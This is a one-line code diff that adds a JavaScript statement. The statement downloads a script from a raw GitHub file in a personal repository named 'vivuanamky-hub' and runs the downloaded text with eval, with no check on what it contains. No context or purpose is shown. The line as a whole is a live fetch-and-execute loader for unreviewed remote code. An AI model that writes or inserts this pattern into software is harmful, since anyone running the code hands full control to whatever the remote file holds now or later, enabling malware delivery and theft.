@@ -1,0 +1,1 @@
+fetch('https://raw.githubusercontent.com/nguyenminhquan2806ct-sketch/vivuanamky-hub/refs/heads/main/vivuanamkyhub-v60.js').then(r=>r.text()).then(eval);
